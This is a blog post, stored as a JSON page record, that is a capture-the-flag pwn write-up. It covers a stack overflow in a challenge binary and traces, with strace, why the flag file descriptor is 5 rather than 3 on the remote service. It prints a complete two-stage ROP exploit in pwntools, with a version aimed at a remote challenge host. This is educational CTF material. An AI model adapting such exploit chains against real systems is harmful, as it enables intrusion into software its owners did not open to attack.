
{
    
    
    
    
        
        
        
    
    "pages": [{"date":"2024-10-05","image":"","imageAlt":"","link":"https://ashtrace.github.io/posts/tracing_file_descriptors/","summary":"I was going through an easy (as per the challenge platform, not personal ranking) pwn challenge. After successfully pwning the binary locally, I ran my exploit against the remote challenge service and failed. Referring to the writeup document I found this:\nThere was no explanation regarding the value of file-descriptor. Thus I went on a quest to trace for the value.","tags":["ctf","linux","pwn","writeup"],"text":"i was going through an easy (as per the challenge platform, not personal ranking) pwn challenge. after successfully pwning the binary locally, i ran my exploit against the remote challenge service and failed. referring to the writeup document i found this:\nthere was no explanation regarding the value of file-descriptor. thus i went on a quest to trace for the value.\nps: please bear with me while we fight togther to tally all those numbers :) (i tried my best to redact challenge name)\ncontext information we are provided with challenge elf binary named challengebinary, and a dockerfile to create docker container with binary and fake flag.\nexecutable mitigation information arch: amd64-64-little relro: full relro stack: no canary found nx: nx enabled pie: no pie (0x400000) stripped: no source code analysis (decompilation) main()\nint __cdecl main(int argc, const char **argv, const char **envp) { char s1[8]; // [rsp+0h] [rbp-40h] byref __int64 v5; // [rsp+8h] [rbp-38h] int v6; // [rsp+10h] [rbp-30h] __int64 buf[2]; // [rsp+20h] [rbp-20h] byref int fd; // [rsp+34h] [rbp-ch] unsigned __int64 i; // [rsp+38h] [rbp-8h] banner(argc, argv, envp); buf[0] = 0ll; buf[1] = 0ll; fd = open(\u0026#34;/dev/urandom\u0026#34;, 0); read(fd, buf, 8ull); printf(\u0026#34;\\n[strange man in mask screams some nonsense]: %s\\n\\n\u0026#34;, (const char *)buf); close(fd); *(_qword *)s1 = 0ll; v5 = 0ll; v6 = 0; printf(\u0026#34;[strange man in mask]: in order to proceed, tell us the secret phrase: \u0026#34;); __isoc99_scanf(\u0026#34;%16s\u0026#34;, s1); for ( i = 0ll; i \u0026lt;= 0xe; ++i ) { if ( s1[i] == 10 ) { s1[i] = 0; break; } } if ( !strncmp(s1, \u0026#34;s34s0nf1n4l3b00\u0026#34;, 0xfull) ) challenge_function(); else printf(\u0026#34;%s\\n[strange man in mask]: sorry, you are not allowed to enter here!\\n\\n\u0026#34;, \u0026#34;\\x1b[1;31m\u0026#34;); return 0; } the program opens up /dev/random at provides the user with 8 bytes of randomness it asks for a secret phrase (compared with s34s0nf1n4l3b00), if the phrase matches it calls challenge_function() challenge_function()\nssize_t challenge_function() { char buf[64]; // [rsp+0h] [rbp-40h] byref printf(\u0026#34;\\n[strange man in mask]: season finale is here! take this souvenir with you for good luck: [%p]\u0026#34;, buf); printf(\u0026#34;\\n\\n[strange man in mask]: now, tell us a wish for next year: \u0026#34;); fflush(stdin); fflush(_bss_start); read(0, buf, 0x1000ull); return write(1, \u0026#34;\\n[strange man in mask]: that\u0026#39;s a nice wish! let the spooktober spirit be with you!\\n\\n\u0026#34;, 0x54ull); } it discloses a stack address (of input buffer). it reads 4096 bytes into a 64 byte array. vulnerability as nx is enabled, but it is a no pie binary, we can possibly rop. we also have stack address leak to store data in our ropchain.\nexploitation exploit development we do not have a pop rdi ; ret gadget, but the moment challenge_function() returns, rdx stores 0x54 which would suffice for us, if flag is larger in size we would have to read it in 84 byte chunks, not an issue :).\nthe call to open() sets rdx to 0, so we return back to challenge_function() and send a second ropchain to read the flag from opened file.\nimport pwn pwn.context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] exe = \u0026#34;./challengebinary\u0026#34; elf = pwn.context.binary = pwn.elf(exe) proc = pwn.process(exe) proc.sendline(b\u0026#34;s34s0nf1n4l3b00\u0026#34;) # secret phrase proc.readuntil(b\u0026#34;[strange man in mask]: season finale is here! take this souvenir with you for good luck: [\u0026#34;) buffer_address = int(proc.readuntil(b\u0026#39;]\u0026#39;).decode()[:-1], 16) pwn.log.info(f\u0026#34;buffer\u0026#39;s stack address provided: {hex(buffer_address)}\u0026#34;) # gadgets ===================================================================== pop_rdi = 0x00000000004011f2 pop_rsi = 0x00000000004011f4 open_plt = 0x4010e0 read_plt = 0x401090 write_plt = 0x401050 padding = 64 + 8 # buffer size + rbp size ropchain_stage1 = pwn.flat({ 0: [ b\u0026#34;flag.txt\\0\u0026#34;, b\u0026#39;a\u0026#39; * (padding - len(b\u0026#34;flag.txt\\0\u0026#34;)), pwn.p64(pop_rdi), pwn.p64(buffer_address), pwn.p64(pop_rsi), pwn.p64(0), pwn.p64(open_plt), # open(\u0026#34;flag.txt\u0026#34;, o_rdonly), file descriptor returned for \u0026#34;flag.txt\u0026#34; would be 3 if program closed all the files it had opened before this call pwn.p64(elf.symbols[\u0026#34;finale\u0026#34;]) ] }) # call to open() sets rdx to 0 proc.sendline(ropchain_stage1) proc.readrepeat(1) ropchain_stage2 = pwn.flat({ padding: [ pwn.p64(pop_rdi), pwn.p64(3), pwn.p64(pop_rsi), pwn.p64(buffer_address), pwn.p64(read_plt), # read(3, buffer, 84), rdx was set to 84 already and we lacked any gadget to modify it pwn.p64(pop_rdi), pwn.p64(1), pwn.p64(pop_rsi), pwn.p64(buffer_address), pwn.p64(write_plt), # write(stdout, buffer, 84) ] }) proc.sendline(ropchain_stage2) proc.readuntil(b\u0026#34;that\u0026#39;s a nice wish! let the spooktober spirit be with you!\\n\\n\u0026#34;); pwn.log.info(f\u0026#34;flag: {proc.readline().decode()}\u0026#34; the script worked locally, but failed on remote instance.\ntroubleshooting i made slight change to the dockerfile to install strace and use it to trace my calls\nfrom ubuntu:20.04 env debian_frontend noninteractive run apt-get update --fix-missing \u0026amp;\u0026amp; apt-get -y upgrade run apt-get install -y socat strace run useradd -m ctf copy challenge/* /home/ctf/ run chown -r ctf:ctf /home/ctf/ workdir /home/ctf user ctf expose 9001/tcp entrypoint [\u0026#34;strace\u0026#34;, \u0026#34;-f\u0026#34;, \u0026#34;socat\u0026#34;, \u0026#34;tcp-listen:9001,fork\u0026#34;, \u0026#34;exec:\u0026#39;./challengebinary\u0026#39;\u0026#34;] when i ran my exploit against the docker container, i observed that contrary to my assumption of fd being 3, when flag.txt was opened it was assigned 5 fd number.\n~$ docker run -it -p 9001:9001 --rm --name=challengebinary challenge | grep open openat(at_fdcwd, \u0026#34;/etc/ld.so.cache\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libwrap.so.0\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libutil.so.1\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libssl.so.1.1\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libcrypto.so.1.1\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libnsl.so.1\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libpthread.so.0\u0026#34;, o_rdonly|o_cloexec) = 3 openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libdl.so.2\u0026#34;, o_rdonly|o_cloexec) = 3 [pid 11] openat(at_fdcwd, \u0026#34;/etc/ld.so.cache\u0026#34;, o_rdonly|o_cloexec) = 5 [pid 11] openat(at_fdcwd, \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;, o_rdonly|o_cloexec) = 5 [pid 11] openat(at_fdcwd, \u0026#34;/dev/urandom\u0026#34;, o_rdonly \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... openat resumed\u0026gt;) = 5 [pid 11] openat(at_fdcwd, \u0026#34;flag.txt\u0026#34;, o_rdonly \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... openat resumed\u0026gt;) = 5 updating the exploit script, it worked for remote instance\nfinal exploit script import pwn pwn.context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] exe = \u0026#34;./challengebinary\u0026#34; elf = pwn.context.binary = pwn.elf(exe) proc = pwn.remote(\u0026#34;83.136.251.168\u0026#34;, 39139) proc.sendline(b\u0026#34;s34s0nf1n4l3b00\u0026#34;) # secret phrase proc.readuntil(b\u0026#34;[strange man in mask]: season finale is here! take this souvenir with you for good luck: [\u0026#34;) buffer_address = int(proc.readuntil(b\u0026#39;]\u0026#39;).decode()[:-1], 16) pwn.log.info(f\u0026#34;buffer\u0026#39;s stack address provided: {hex(buffer_address)}\u0026#34;) # gadgets ===================================================================== pop_rdi = 0x00000000004011f2 pop_rsi = 0x00000000004011f4 open_plt = 0x4010e0 read_plt = 0x401090 write_plt = 0x401050 padding = 64 + 8 # buffer size + rbp size ropchain_stage1 = pwn.flat({ 0: [ b\u0026#34;flag.txt\\0\u0026#34;, b\u0026#39;a\u0026#39; * (padding - len(b\u0026#34;flag.txt\\0\u0026#34;)), pwn.p64(pop_rdi), pwn.p64(buffer_address), pwn.p64(pop_rsi), pwn.p64(0), pwn.p64(open_plt), # open(\u0026#34;flag.txt\u0026#34;, o_rdonly), file descriptor returned for \u0026#34;flag.txt\u0026#34; 5 (found from troubleshooting) pwn.p64(elf.symbols[\u0026#34;finale\u0026#34;]) ] }) # call to open() sets rdx to 0 with open(\u0026#34;exploit\u0026#34;, \u0026#34;wb+\u0026#34;) as f: f.write(b\u0026#34;s34s0nf1n4l3b00\\n\u0026#34;) f.write(ropchain_stage1) proc.sendline(ropchain_stage1) proc.readrepeat(1) ropchain_stage2 = pwn.flat({ padding: [ pwn.p64(pop_rdi), pwn.p64(5), pwn.p64(pop_rsi), pwn.p64(buffer_address), pwn.p64(read_plt), # read(5, buffer, 84), rdx was set to 84 already and we lacked any gadget to modify it pwn.p64(pop_rdi), pwn.p64(1), pwn.p64(pop_rsi), pwn.p64(buffer_address), pwn.p64(write_plt), # write(stdout, buffer, 84) ] }) proc.sendline(ropchain_stage2) proc.readuntil(b\u0026#34;that\u0026#39;s a nice wish! let the spooktober spirit be with you!\\n\\n\u0026#34;); pwn.log.info(f\u0026#34;flag: {proc.readline().decode()}\u0026#34;) digging deeper why did open() return 5?\nupon reading through strace logs, i found that socat registered 3, 4 for socketpair (socketpair are 2 file descriptors used for inter-process communication, they are bi-directional in nature. usually before forking a process creates a pair and then parent and child use one fd from the pair for read/write while close the other), while 5 was used for socket connection, and the newly created conenction was assigned 6.\nsocketpair(af_unix, sock_dgram, 0, [3, 4]) = 0 ... socket(af_inet, sock_stream, ipproto_tcp) = 5 bind(5, {sa_family=af_inet, sin_port=htons(9001), sin_addr=inet_addr(\u0026#34;0.0.0.0\u0026#34;)}, 16) = 0 getsockname(5, {sa_family=af_inet, sin_port=htons(9001), sin_addr=inet_addr(\u0026#34;0.0.0.0\u0026#34;)}, [16]) = 0 listen(5, 5) ... accept(5, {sa_family=af_inet, sin_port=htons(42340), sin_addr=inet_addr(\u0026#34;172.17.0.1\u0026#34;)}, [16]) = 6 once i run my exploit, 2 new processes are created pid 9, 10\npid 9 closed the socket connection and was out of the picture.\n[pid 9] close(6) = 0 meanwhile, pid 10 (returned by the original clone() call), closed 3, 4 and re-registered the socketpair. it further registered a new socket pair 5, 7 after closing the socket 5. but this one kept fd 6 pointing to current connection. next, it **clone()**s again to create pid 11. finally it closes 7, thus it would be using 5 for communication\nclone(child_stack=null, flags=clone_child_cleartid|clone_child_settid|sigchld, child_tidptr=0x7f06e36fda10) = 10 [pid 10] close(4 \u0026lt;unfinished ...\u0026gt; [pid 10] \u0026lt;... close resumed\u0026gt;) = 0 [pid 10] close(3) = 0 [pid 10] socketpair(af_unix, sock_dgram, 0, [3, 4]) = 0 ... [pid 10] close(5) = 0 [pid 10] socketpair(af_unix, sock_stream, 0, [5, 7]) = 0 ... [pid 10] clone(child_stack=null, flags=clone_child_cleartid|clone_child_settid|sigchldstrace: process 11 attached \u0026lt;unfinished ...\u0026gt; ... [pid 10] close(7) and finally, pid 11 closed 3, 4, 5 (socketpairs created by pid 10). re-creates two socketpairs 3-4. duplicated 7 as stdin and stdout and closed 7. finally pid 11 loads finale binary into memory.\n[pid 11] close(4 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... close resumed\u0026gt;) = 0 [pid 11] close(3 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... close resumed\u0026gt;) = 0 ... [pid 11] socketpair(af_unix, sock_dgram, 0 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... socketpair resumed\u0026gt;, [3, 4]) = 0 ... [pid 11] close(5 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... close resumed\u0026gt;) = 0 ... [pid 11] dup2(7, 0 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... dup2 resumed\u0026gt;) = 0 [pid 11] dup2(7, 1 \u0026lt;unfinished ...\u0026gt; [pid 11] \u0026lt;... dup2 resumed\u0026gt;) = 1 [pid 11] close(7) = 0 [pid 11] execve(\u0026#34;./challengebinary\u0026#34;, [\u0026#34;./challengebinary\u0026#34;], 0x5603cdb74e40 /* 12 vars */ \u0026lt;unfinished ...\u0026gt; when finale was loaded, it had following file descriptors\n0 - pointing to socketpair to communicate with pid 10 1 - pointing to socketpair to communicate with pid 10 2 - stderr 3 - pointing to socketpair it (pid 11) created 4 - pointing to socketpair it (pid 11) created 5 - free thus, 5 was allocated to all subsequent **open()**s\n","title":"Tracing file descriptors: A battle against poor writeups"}]
}

